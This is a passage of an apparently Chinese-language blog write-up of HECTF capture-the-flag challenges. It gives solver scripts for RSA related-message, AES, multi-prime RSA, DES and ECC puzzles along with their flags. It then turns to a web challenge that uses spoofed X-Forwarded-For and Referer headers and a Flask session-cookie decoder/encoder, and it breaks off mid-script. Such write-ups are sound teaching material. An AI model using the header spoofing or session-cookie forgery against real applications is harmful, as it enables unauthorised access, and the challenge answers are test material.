class="number">5702553209026762891130621254037294747819864952568824327221430749829654552175171307151888953348659971422228556686092434932000213695492351602755144510029319044193567051613888876933660356756790444392278614143455408803808095980542751023095024106689759843322130186219560734082292015929006937318400901378373771587448471762923415750064340829545587346927358411518874090282598069394946985795177419501659425500481799157093068337225389827654860680897913114945871197415129055139716514884716404289565297854681809258375973195355836553939670482515484347869258398517276876478311544109924573128946617113822561968330536525876279165313</span></span><br><span class="line">c2 = <span class="number">17562619948191690401152271053920025392401205523418067246455197241332062181407775133406742024747779181762812656501246379566147855594504112107873162350649668441267907193889705868572309785100582281795380779594946422800722070311908572538672508371123334385630310655242811756206073131919770939609347021343765434127086363844595938894714892990053114153402729297796655717510572619694559203260762574159375142757462082162882775921182437134358375300674547217425590072112733480640372328934982979603312597484512120618223179217692002851194538130349201457319160001114007059615596355221194709809437500052122684989302563103918409825040</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c1 = (30509*m + 13601)^17 % n </span></span><br><span class="line"><span class="comment"># c2 = (92095*m + 27065)^17 % n</span></span><br></pre></td></tr></table></figure><p>目前卡在最后一步</p><p>已知c1和c2 和n 如何求出m</p><p>=&gt; 相关明文攻击</p><p><a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/index.html">脚本来源</a></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119230808324.png" alt="image-20231119230808324"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#脚本1</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">c1, c2, n, e</span>):</span><br><span class="line">    PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">    <span class="comment"># replace a,b,c,d</span></span><br><span class="line">    a = <span class="number">30509</span> </span><br><span class="line">    b = <span class="number">13601</span></span><br><span class="line">    c = <span class="number">92095</span></span><br><span class="line">    d = <span class="number">27065</span></span><br><span class="line">    g1 = (a*x+b)^e - c1</span><br><span class="line">    g2 = (c*x+d)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line">n = <span class="number">25797576442752368834409243494498462987370374608513814739930733437032797864549696772439769896270235017474841764016848627149724764584643408544417890463920153063835758878658712790547466715525246861709503145754424896044647787146006099053059124466248594151765065039034244830614724509092882854620642569723528913880146979990993657935598837645247839225413889995373643109990149255485373119338024345925311643249141660177285328457994476509430988280481564046398593906405870633323621548853838399385539924067139236445142933316057900841508972844270649504321178274091144241788883353514769368447833090379142367062327674855735832181241</span></span><br><span class="line">c1 = <span class="number">5702553209026762891130621254037294747819864952568824327221430749829654552175171307151888953348659971422228556686092434932000213695492351602755144510029319044193567051613888876933660356756790444392278614143455408803808095980542751023095024106689759843322130186219560734082292015929006937318400901378373771587448471762923415750064340829545587346927358411518874090282598069394946985795177419501659425500481799157093068337225389827654860680897913114945871197415129055139716514884716404289565297854681809258375973195355836553939670482515484347869258398517276876478311544109924573128946617113822561968330536525876279165313</span></span><br><span class="line">c2 = <span class="number">17562619948191690401152271053920025392401205523418067246455197241332062181407775133406742024747779181762812656501246379566147855594504112107873162350649668441267907193889705868572309785100582281795380779594946422800722070311908572538672508371123334385630310655242811756206073131919770939609347021343765434127086363844595938894714892990053114153402729297796655717510572619694559203260762574159375142757462082162882775921182437134358375300674547217425590072112733480640372328934982979603312597484512120618223179217692002851194538130349201457319160001114007059615596355221194709809437500052122684989302563103918409825040</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">m1 = attack(c1, c2, n, e)</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="string">&quot;%x&quot;</span> % <span class="built_in">int</span>(m1)))</span><br><span class="line"><span class="built_in">print</span>(m1)</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m1)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;HECTF&#123;r3411y_easy_R4nd0m_And_r3l4ted_m3554ge_att4ck&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="我们仨-solved">我们仨|(solved)</h3><h4 id="考点：aes-异或-多素数rsa解密-des">考点：AES 异或 多素数rsa解密 DES</h4><h4 id="解题：">解题：</h4><p>三层套娃：</p><p>第一关：</p><p>与NewStarWeek1非常一模一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># from flag import flag</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> data + <span class="string">b&quot;&quot;</span>.join([<span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span> - <span class="built_in">len</span>(data))])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_program</span>():</span><br><span class="line">    secret_data = padding(flag)</span><br><span class="line">    secret_key = os.urandom(<span class="number">16</span>) * <span class="number">2</span></span><br><span class="line">    init_vector = os.urandom(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(bytes_to_long(secret_key) ^ bytes_to_long(init_vector) ^ <span class="number">1</span>)</span><br><span class="line">    cipher = AES.new(secret_key, AES.MODE_CBC, init_vector)</span><br><span class="line">    encrypted_flag = cipher.encrypt(secret_data)</span><br><span class="line">    <span class="built_in">print</span>(encrypted_flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># if __name__ == &quot;__main__&quot;:</span></span><br><span class="line"><span class="comment">#     execute_program()</span></span><br><span class="line"></span><br><span class="line">data = <span class="number">113271863767201424639329153097952947311122854394813183532903131317262533549675</span></span><br><span class="line">c = <span class="string">b&#x27;_1\x16\xc2;\xb1\xddy\x14\xdd\x14\xe5&#123;\x19\x04:&#x27;</span></span><br><span class="line">data = data ^ <span class="number">1</span></span><br><span class="line">key = long_to_bytes(data)[:<span class="number">16</span>] * <span class="number">2</span></span><br><span class="line">iv = bytes_to_long(key) ^ data</span><br><span class="line">iv = long_to_bytes(iv) </span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">dec_flag = aes.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(dec_flag)</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>第二关：</p><p>直接分解n</p><p>获得一系列小素数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n= <span class="number">17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line">c= <span class="number">7650350848303138131393086727727533413756296838218347123997040508192472569084746342253915001354023303648603939313635106855058934664365503492172</span></span><br><span class="line"><span class="comment"># P = [2217990919</span></span><br><span class="line"><span class="comment"># ,4278428893</span></span><br><span class="line"><span class="comment"># , 2804303069</span></span><br><span class="line"><span class="comment"># , 3654864131</span></span><br><span class="line"><span class="comment"># , 2923072267</span></span><br><span class="line"><span class="comment"># , 2338725373</span></span><br><span class="line"><span class="comment"># , 2706073949</span></span><br><span class="line"><span class="comment"># , 2970591037</span></span><br><span class="line"><span class="comment"># , 2370292207</span></span><br><span class="line"><span class="comment"># , 2463878387</span></span><br><span class="line"><span class="comment"># , 3939901243</span></span><br><span class="line"><span class="comment"># , 2794985117</span></span><br><span class="line"><span class="comment"># , 3207148519</span></span><br><span class="line"><span class="comment"># , 4093178561</span></span><br><span class="line"><span class="comment"># , 3831680819]</span></span><br><span class="line">P = [<span class="number">2217990919</span></span><br><span class="line">,<span class="number">4278428893</span></span><br><span class="line">,<span class="number">2794985117</span></span><br><span class="line">,<span class="number">3831680819</span></span><br><span class="line">,<span class="number">2804303069</span></span><br><span class="line">,<span class="number">2923072267</span></span><br><span class="line">,<span class="number">3939901243</span></span><br><span class="line">,<span class="number">2463878387</span></span><br><span class="line">,<span class="number">2970591037</span></span><br><span class="line">,<span class="number">2706073949</span></span><br><span class="line">,<span class="number">3654864131</span></span><br><span class="line">,<span class="number">2370292207</span></span><br><span class="line">,<span class="number">2338725373</span></span><br><span class="line">,<span class="number">4093178561</span></span><br><span class="line">,<span class="number">3207148519</span>]</span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P)):</span><br><span class="line">    phi *= P[i]-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="comment"># m = 10657149102724042824057034258679160487094630140056870412930577982121073769242507083776</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>进入第三关：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gIHkeIlRQp1fLeSWEqZJdOTO4aRYRB2OGRcBycHQ1OAdi6UEULYbwIvYh+0alYScSEoN4TOejgTjdPsetrURRlLX6dcifjX6VvLxY7TnMk7c8/xy17mybq/yNQf0vFGh8byC88bUeHian9dA2Qh6rRBYS1I7iNxM62RtCFZ+1OKeaqGIDjf3/VuPlbnCePYIY5FVs6xNXjkGh0m57t2QW4CoGI5lz6OcAAwg4AHP0d8CfeldOF/TogPwOiPaRlDbtHXCh54Bs5ZivV+jDerr0RQvCGYBFHYLJnvyrFtyZC9BxAQ8gQnGlWNDjE1V6BByUvJjpI9DcUyRSNN21rUWouOiLwtKX0BgDQkGH9PhtzhmGYI+R3lZJ4x30l+Xqweu</span><br><span class="line"></span><br><span class="line">DES CBC PKCS7 key：hectf iv：<span class="number">0000</span></span><br></pre></td></tr></table></figure><p>找到一个<a href="https://the-x.cn/cryptography/Des.aspx">在线网址</a> 很多是无法操作的 但是这个可以</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119103228110.png" alt="image-20231119103228110"></p><p>成功获得flag：<code>HECTF&#123;DES_RSA_AES_WOMENSA_ZHENQIANG&#125;</code></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119162730981.png" alt="image-20231119162730981"></p><h3 id="esayecc">esayecc</h3><h4 id="考点：ecc椭圆曲线加密">考点：ECC椭圆曲线加密</h4><h4 id="解题：">解题：</h4><p>首先给了一个私钥文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgotFz7q/WASYctvjN</span><br><span class="line">Cm4zE7fkywF7jJV0nIME7bsW2i6hRANCAARClk9phO799cZ7E/ZF3ByjzczSz2Wd</span><br><span class="line">fuVuLvrNSK0wlUCXegI/pVSDhvLM9diYBj0hear1pO4tA89Kttmsl4Bf</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>利用在线网址进行解密 获得公钥文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEQpZPaYTu/fXGexP2Rdwco83M0s9l</span><br><span class="line">nX7lbi76zUitMJVAl3oCP6VUg4byzPXYmAY9IXmq9aTuLQPPSrbZrJeAXw==</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>利用<a href="https://www.ssleye.com/ssltool/pub_asysi.html">在线工具</a> 对公钥文件进行解密:</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119101454309.png" alt="image-20231119101454309"></p><p>原题代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> ECC</span><br><span class="line"><span class="keyword">from</span> fastecdsa <span class="keyword">import</span> curve</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line">me = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">key = ECC.generate(curve=<span class="string">&#x27;NIST P-256&#x27;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;pem.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(key.export_key(<span class="built_in">format</span>=<span class="string">&#x27;PEM&#x27;</span>))</span><br><span class="line">G = key.public_key()</span><br><span class="line">k = key.d</span><br><span class="line">n = G.order()</span><br><span class="line">p = curve.P256.p</span><br><span class="line">r = randprime(<span class="number">1</span>, n-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">M = E.random_point()</span><br><span class="line"><span class="comment"># M = (mx, my)</span></span><br><span class="line">e = nextprime(my-mx)</span><br><span class="line">N = n * p</span><br><span class="line">c = <span class="built_in">pow</span>(me, e, <span class="built_in">int</span>(N))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line">K = k*G</span><br><span class="line">c1 = M+r*K</span><br><span class="line">c2 = r*G</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = 340411986008332622492252515156919590702658555525072399052451683041772652474839788525448087771416400264570261404595656046016551644464496921197111421138765</span></span><br><span class="line"><span class="comment"># c1 = (71430232672331113271988412132459391678542075997754159037222774180961171917977 : 62238630405406252154015032808640586594811636815028129383858020738965206372881 : 1)</span></span><br><span class="line"><span class="comment"># c2 = (25742109236464952840117078659367834030129507446418393682693133323915430074859 : 65657711071079869088595294059522027768683424454908946840021611773238453793364 : 1)</span></span><br></pre></td></tr></table></figure><h2 id="web">web</h2><h3 id="伪装者">伪装者</h3><p>首先本地访问：</p><p><code>X-Forwarded-For: 127.0.0.1</code></p><p>然后Referer：</p><p><code>Referer: ctf.sc0de.com</code></p><p>最后使用的浏览器：</p><p><code>User-Agent: Firefox</code></p><p>然后进入username的检测</p><p>我们发现在输入框中 单纯输入<code>zxk1ing</code> 是无法成功进入的</p><p>注意到存在session</p><p>把session利用下面脚本进行解密  <a href="https://m.freebuf.com/articles/web/331823.html">脚本来源</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;</span></span><br><span class="line">__author__ = <span class="string">&#x27;Wilson Sumanang, Alexandre ZANNI&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># standard imports</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="comment"># Abstract Base Classes (PEP 3119)</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &lt; <span class="number">3</span>: <span class="comment"># &lt; 3.0</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Must be using at least Python 3&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABC, abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lib for argument parsing</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># external Imports</span></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MockApp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret_key</span>):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">FSCM</span>(metaclass=ABCMeta):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">session_cookie_value, secret_key=<span class="literal">None</span></span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">FSCM</span>(<span class="title class_ inherited__">ABC</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">session_cookie_value, secret_key=<span class="literal">None</span></span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">   